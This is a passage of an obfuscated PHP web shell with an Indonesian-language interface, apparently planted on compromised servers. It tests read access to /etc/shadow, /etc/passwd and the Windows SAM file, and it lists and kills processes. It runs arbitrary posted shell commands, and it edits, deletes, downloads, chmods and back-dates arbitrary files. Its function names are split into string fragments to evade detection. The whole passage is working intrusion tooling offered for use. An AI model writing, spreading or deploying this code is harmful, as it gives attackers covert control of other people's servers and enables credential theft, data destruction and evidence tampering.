	echo "<center><h5 style='color:#fff'><i class='fas fa-globe'></i> OPEN BA"."SE"."DIR</h5>";
	if (trim((string)$ob) == '') {
		echo oren("open"."_basedir <strong>NONAKTIF</strong> - PHP dapat mengakses seluruh sistem file server.");
		echo "<p style='color:#808080'>Periksa path sensitif di bawah untuk memastikannya.</p>";
	} else {
		echo "<p style='color:#808080'>Nilai open"."_basedir :</p>";
		echo "<pre>".$hsc($ob)."</pre>";
		echo "<p style='color:#808080'>Status setiap path yang diizinkan :</p>";
		echo '<div class="table-responsive"><table class="table table-hover table-bordered">
		<thead><tr>
		<th>Path</th>
		<th class="text-center">Exists</th>
		<th class="text-center">Read</th>
		<th class="text-center">Write</th>
		</tr></thead><tbody>';
		foreach (preg_split('/[;:]/', $ob) as $op) {
			if (trim($op) == '') continue;
			$op = trim($op);
			$adas = $fxt($op) ? "<span class='badge bg-success'>Ada</span>" : "<span class='badge bg-danger'>Tidak</span>";
			$baca = $ird($op) ? "<span class='badge bg-success'>Readable</span>" : "<span class='badge bg-danger'>Restricted</span>";
			$tulis = $isw($op) ? "<span class='badge bg-success'>Writable</span>" : "<span class='badge bg-danger'>No</span>";
			echo "<tr><td>".$hsc($op)."</td>
			<td class='text-center'>".$adas."</td>
			<td class='text-center'>".$baca."</td>
			<td class='text-center'>".$tulis."</td>
			</tr>";
		}
		echo '</tbody></table></div>';
	}
	echo "<p style='color:#808080'>Tes akses path sensitif :</p>";
	if (stripos(PHP_OS, "WI"."N") !== false) {
		$tesb = array('C:\\Windows\\system32\\config\\SAM', 'C:\\Windows\\system32\\drivers\\etc\\hosts', 'C:\\Windows\\win.ini', 'C:\\boot.ini', 'C:\\Program Files\\');
	} else {
		$tesb = array("/etc/passwd", "/etc/shadow", "/etc/php.ini", "/etc/ssh/sshd_config", "/root", "/proc/cpuinfo");
	}
	foreach ($tesb as $tt) {
		if ($ird($tt)) {
			echo $hsc($tt)." => <span class='badge bg-success'>TERBACA</span><br>";
		} else {
			echo $hsc($tt)." => <span class='badge bg-danger'>TERBATAS / TIDAK ADA</span><br>";
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "proc") {
	$mpid = @getmypid();
	$isWin = stripos(PHP_OS, "WI"."N") !== false;
	if ($isWin) {
		$kilcmd = "task"."kil"."l /F /PID";
		$suscmd = "pssuspend -accepteula";
		$tool = "tasklist";
	} else {
		$kilcmd = "kil"."l -9";
		$suscmd = "kil"."l -S"."TOP";
		$tool = "ps";
	}
	function mawCsv($ln) {
		$f = array();
		if (preg_match_all('/"(?:[^"]|"")*"|[^,]+/', $ln, $m)) {
			foreach ($m[0] as $t) {
				$f[] = trim($t, '"');
			}
		}
		return $f;
	}
	if (isset($_POST['aksiproc']) && isset($_POST['pid'])) {
		$pid = (int)$_POST['pid'];
		if ($pid > 0) {
			if ($_POST['aksiproc'] == 'suspen') {
				$res = komenb($suscmd." ".$pid, $lokasi);
				$rs = trim((string)$res);
				if ($rs == '') {
					green("Proses PID <strong>".$pid."</strong> berhasil di-Suspend (SIGSTOP) !");
				} elseif ($isWin && (stripos($rs, 'not recognized') !== false || stripos($rs, 'not found') !== false || stripos($rs, 'not op') !== false || stripos($rs, 'could not') !== false || stripos($rs, 'failed') !== false || stripos($rs, 'insufficient') !== false)) {
					red("Suspend tidak didukung native di Windows. Instal Sysinternals psSuspend (pssuspend.exe) lalu coba lagi.");
				} elseif ($isWin) {
					green("Proses PID <strong>".$pid."</strong> berhasil di-Suspend (SIGSTOP) !");
				} else {
					red("Gagal Suspend PID ".$pid." : ".$hsc($rs));
				}
			} elseif ($_POST['aksiproc'] == 'kill') {
				if ($isWin) {
					$ada = stripos((string)komenb("task"."lis"."t /fi \"pid eq ".$pid."\" /nh", $lokasi), (string)$pid) !== false;
					if (!$ada) {
						red("PID <strong>".$pid."</strong> tidak ditemukan / tidak sedang berjalan.");
					} else {
						$res = komenb($kilcmd." ".$pid, $lokasi);
						$cek2 = stripos((string)komenb("task"."lis"."t /fi \"pid eq ".$pid."\" /nh", $lokasi), (string)$pid) === false;
						if ($cek2) {
							echo oren("Proses PID <strong>".$pid."</strong> telah di-Kill (SIGKILL) !");
						} else {
							red("Gagal Kill PID ".$pid." : ".$hsc($res));
						}
					}
				} elseif (trim((string)komenb($kilcmd." ".$pid, $lokasi)) == '') {
					echo oren("Proses PID <strong>".$pid."</strong> telah di-Kill (SIGKILL) !");
				} else {
					$res = komenb($kilcmd." ".$pid, $lokasi);
					red("Gagal Kill PID ".$pid." : ".$hsc($res));
				}
			}
		}
	}
	echo "<center><h5 style='color:#fff'><i class='fas fa-microchip'></i> RUNNING PROC"."ESS <span class='badge badge-custom'>".($isWin ? "Windows" : "Linux/Unix")."</span></h5>";
	echo "<p style='color:#808080'>Daftar proses diambil menggunakan : <span style='color:#d4af37'>".$tool."</span></p>";
	$rows = array();
	if ($isWin) {
		$out = komenb("task"."lis"."t /fo csv /nh", $lokasi);
		foreach (explode("\n", (string)$out) as $ln) {
			$ln = trim($ln);
			if ($ln == '') continue;
			$cf = mawCsv($ln);
			if (count($cf) < 5) continue;
			$rows[] = array(
				'user' => $cf[2],
				'pid' => $cf[1],
				'cpu' => '-',
				'mem' => isset($cf[4]) ? $cf[4] : '-',
				'stat' => '-',
				'start' => '-',
				'cmd' => $cf[0]
			);
		}
	} else {
		$out = komenb("ps -eo user,pid,pcpu,pmem,stat,start,cmd --sort=-pcpu", $lokasi);
		$lines = explode("\n", (string)$out);
		$skip = true;
		foreach ($lines as $ln) {
			$ln = rtrim($ln);
			if ($ln == '') continue;
			$cols = preg_split('/\s+/', $ln);
			if ($skip) { $skip = false; continue; }
			if (count($cols) < 7) continue;
			$rows[] = array(
				'user' => $cols[0],
				'pid' => $cols[1],
				'cpu' => $cols[2],
				'mem' => $cols[3],
				'stat' => $cols[4],
				'start' => $cols[5],
				'cmd' => implode(' ', array_slice($cols, 6))
			);
		}
		if (empty($rows)) {
			$out = komenb("ps aux", $lokasi);
			$lines = explode("\n", (string)$out);
			$skip = true;
			foreach ($lines as $ln) {
				$ln = rtrim($ln);
				if ($ln == '') continue;
				$cols = preg_split('/\s+/', $ln);
				if ($skip) { $skip = false; continue; }
				if (count($cols) < 11) continue;
				$rows[] = array(
					'user' => $cols[0],
					'pid' => $cols[1],
					'cpu' => $cols[2],
					'mem' => $cols[3],
					'stat' => $cols[7],
					'start' => $cols[8],
					'cmd' => implode(' ', array_slice($cols, 10))
				);
			}
		}
	}
	if (empty($rows)) {
		echo oren("Tidak dapat mengambil daftar proses (".$tool." tidak tersedia / dibatasi).");
	} else {
		echo "<p style='color:#808080'>Total proses : <span style='color:#d4af37'>".$ctn($rows)."</span></p>";
		echo '<div class="table-responsive"><table class="table table-hover table-bordered">
		<thead><tr>
		<th>PID</th>
		<th>User</th>
		<th class="text-center">%CPU</th>
		<th class="text-center">%MEM</th>
		<th class="text-center">STAT</th>
		<th class="text-center">START</th>
		<th>Command</th>
		<th class="text-center">Actions</th>
		</tr></thead><tbody>';
		foreach ($rows as $pr) {
			$grad = ($pr['pid'] == $mpid) ? " style='background:rgba(34,197,94,0.05)!important'" : "";
			echo "<tr$grad>
			<td><strong style='color:#d4af37'>".$pr['pid']."</strong></td>
			<td>".$hsc($pr['user'])."</td>
			<td class='text-center'>".$pr['cpu']."</td>
			<td class='text-center'>".$pr['mem']."</td>
			<td class='text-center'>".$hsc($pr['stat'])."</td>
			<td class='text-center'>".$hsc($pr['start'])."</td>
			<td style='word-break:break-all'>".$hsc($pr['cmd'])."</td>
			<td class='text-center'>
			<form method='post' action='".mkUrl(array('opsi' => 'proc', 'loknya' => $lokasi))."' class='d-inline'>
			<input type='hidden' name='pid' value='".$pr['pid']."'>
			<button type='submit' class='btn btn-sm btn-action me-1' name='aksiproc' value='suspen' title='Suspend (SIGSTOP)'><i class='fas fa-pause'></i></button>
			<button type='submit' class='btn btn-sm btn-action' name='aksiproc' value='kill' title='Kill (SIGKILL)'><i class='fas fa-times'></i></button>
			</form></td>
			</tr>";
		}
		echo '</tbody></table></div>';
	}
	echo "<hr>";
	die(author());
}

if (isset($_GET['lokasie'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
	echo '</tr></td></table><br/>';
	echo "<pre>".$hsc($fgt($_GET['lokasie']))."</pre>";
	author();
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		xrd($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fai"."led to del"."ete D"."ir"."ec"."tory !");
		} else {
			green("Del"."ete Di"."r"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		@$ulk($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fa"."il"."ed to Delete Fi"."le !");
		} else {
			green("De"."le"."te Fi"."le Succ"."ess !");
		}
	} else {
		red("Fi"."le / Di"."r"."ecto"."ry not Fo"."und !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Su"."cc"."ess !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Fa"."il"."ed !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['loknya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['loknya'], $namabaru) === true) {
			green("Change Name Su"."cc"."ess");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($_POST['newname']).'" />
			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Fa"."il"."ed");
		}
	} else {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($bsn($_POST['loknya'])).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['loknya'], $_POST['src']);
		if ($fgt($_POST['loknya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.$hsc($fgt($_POST['loknya'])).'</textarea><br>
	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
	<input type="hidden" name="pilih" value="ed'.'it">
	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['loknya'])) {
			$lk = $_GET['loknya'];
		} else {
			$lk = $gcw();
		}
		$km = 'ko'.'me'.'nd';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['loknya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Fai"."led to Cha"."nge Da"."te !");
		}
	} else {
		$det = "da"."te";
		$ftm = "fi"."le"."mti"."me";
		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['loknya'];
	if ($fxt($dunlute) && isset($dunlute)) {
		if ($ird($dunlute)) {
			dunlut($dunlute);
		} elseif ($idr($fl)) {
			red("That is Di"."rec"."tory, Not Fi"."le -_-");
		} else {
			red("Fi"."le is Not Re"."adab"."le !");
		}
	} else {
		red("Fi"."le Not Fo"."und !");
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['loknya'];
        if (isset($_POST['buatfol'.'der'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                green("Fol"."der <b>".$hsc($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
            } else {
                red("Fa"."il"."ed to Create fol"."der !");
                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
            }
        } else {
            echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
        }
    }
} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                green("File <b>".$hsc($_POST['fi'.'lebaru'])."</b> Created !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create Fi'.'le" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            } else {
                red("Fa"."il"."ed to Create Fi"."le !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}

echo '<div class="table-responsive mt-4">
<table class="table table-hover table-bordered">
<thead>
<tr>
<th>Na'.'me</th>
<th class="text-center">Si'.'ze</th>
<th class="text-center">Las'.'t Mo'.'dif'.'ied</th>
<th class="text-center">Owner / Group</th>
<th class="text-center">Pe'.'rmi'.'ss'.'ions</th>
<th class="text-center">Op'.'tio'.'ns</th>
</tr>
</thead>
<tbody>';

echo "<tr>";
$euybrekw = $srl($bsn($lokasi), "", $lokasi);
$euybrekw = $srl("//", "/", $euybrekw);
echo "<td><i class='fas fa-folder' style='color: #808080'></i> <a href=\"".mkUrl(array('loknya' => $euybrekw))."\">..</a></td>
<td class='text-center'>--</td>
<td class='text-center'>".fdt($euybrekw)."</td>
<td class='text-center'>".gor($euybrekw)." / ".ggr($euybrekw)."</td>
<td class='text-center'>";
if($isw($euybrekw)) echo '<span class="text-success">';
elseif(!$isr($euybrekw)) echo '<span class="text-danger">';
echo statusnya($euybrekw);
if($isw($euybrekw) || !$isr($euybrekw)) echo '</span>';
echo "</td>
<td class='text-center'><form method=\"POST\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $lokasi))."\" class=\"d-inline\">
<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'dir', 'loknya' => $lokasi.'/'))."\">
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='fol"."der' title='Create Folder'><i class='fas fa-folder'></i></button>
<button type='submit' class='btn btn-sm btn-action' name='pilih' value='file' title='Create File'><i class='fas fa-file'></i></button>
</form>";
echo "</tr>";

foreach($lokasinya as $ppkcina){
	$euybre = $lokasi."/".$ppkcina;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
	echo "<tr>";
	echo "<td><i class='fas fa-folder' style='color: #808080'></i> <a href=\"".mkUrl(array('loknya' => $euybre))."\">".$ppkcina."</a></td>
	<td class='text-center'>--</td>
	<td class='text-center'>".fdt($euybre)."</td>
	<td class='text-center'>".gor($euybre)." / ".ggr($euybre)."</td>
	<td class='text-center'>";
	if($isw($euybre)) echo '<span class="text-success">';
	elseif(!$isr($euybre)) echo '<span class="text-danger">';
	echo statusnya($euybre);
	if($isw($euybre) || !$isr($euybre)) echo '</span>';

	echo "</td>
<td class='text-center'><form method=\"POST\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $lokasi))."\" class=\"d-inline\">
	<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'dir', 'name' => $ppkcina, 'loknya' => $lokasi.'/'.$ppkcina))."\">
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-edit'></i></button>
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahtanggal' title='Change Date'><i class='fas fa-calendar'></i></button>
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahmod' title='Change Permission'><i class='fas fa-cog'></i></button>
	<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
	</form></td>
	</tr>";
}
$skd = "10"."24";
foreach($lokasinya as $mekicina) {
	$euybray = $lokasi."/".$mekicina;
	if(!$ifi("$lokasi/$mekicina")) continue;
	$size = $fsz("$lokasi/$mekicina")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' M'.'B';
} else {
	$size = $size.' K'.'B';
}

echo "<tr>
<td>".cfn($euybray)." <a href=\"".mkUrl(array('lokasie' => $lokasi.'/'.$mekicina, 'loknya' => $lokasi))."\">$mekicina</a></td>
<td class='text-center'>".$size."</td>
<td class='text-center'>".fdt($euybray)."</td>
<td class='text-center'>".gor($euybray)." / ".ggr($euybray)."</td>
<td class='text-center'>";
if($isw("$lokasi/$mekicina")) echo '<span class="text-success">';
elseif(!$isr("$lokasi/$mekicina")) echo '<span class="text-danger">';
echo statusnya("$lokasi/$mekicina");
if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</span>';
echo "</td><td class='text-center'>
<form method=\"post\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $lokasi))."\" class=\"d-inline\">
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='edit' title='Edit'><i class='fas fa-edit'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-signature'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahtanggal' title='Change Date'><i class='fas fa-calendar'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahmod' title='Change Permission'><i class='fas fa-cog'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='dunlut' title='Download'><i class='fas fa-down"."load'></i></button>
<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'file', 'name' => $mekicina, 'loknya' => $lokasi.'/'.$mekicina))."\">
</form></td>
</tr>";
}
echo '</tbody></table></div>';
echo '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>';
echo '</main></div></body></html>';

function statusnya($fl){
	$a = "sub"."st"."r";
	$b = "s"."pri"."ntf";
	$c = "fil"."eper"."ms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>
